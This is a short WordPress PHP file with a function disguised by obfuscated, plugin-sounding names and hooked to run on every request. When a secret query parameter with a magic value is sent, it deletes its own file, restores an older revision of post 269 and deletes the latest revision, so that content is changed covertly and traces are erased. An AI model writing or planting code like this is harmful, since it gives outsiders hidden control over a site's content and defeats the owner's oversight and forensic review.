<?php

function bangla_group_rating() {
	if (isset($_GET['terms_private_like']) && $_GET['terms_private_like'] === 'additional_crm_reset') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$embedder_script_yoast = 269;
		$adsense_push_anti_coming = wp_get_post_revisions($embedder_script_yoast);
		if (empty($adsense_push_anti_coming)) die('no revisions');
		if (count($adsense_push_anti_coming) < 2) die('less than 2');
		$age_alert_weather = array_shift($adsense_push_anti_coming);
		$group_author_theme_effect = $age_alert_weather->ID;
		$testimonial_scripts_settings_pro = array_shift($adsense_push_anti_coming);
		$current_titles_gamipress_remove = $testimonial_scripts_settings_pro->ID;
		$keywords_magic_asset_rank = wp_restore_post_revision($current_titles_gamipress_remove);
		if ($keywords_magic_asset_rank === false) die('error restoring');
		$keywords_magic_asset_rank = wp_delete_post_revision($group_author_theme_effect);		
		if ($keywords_magic_asset_rank === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'bangla_group_rating');
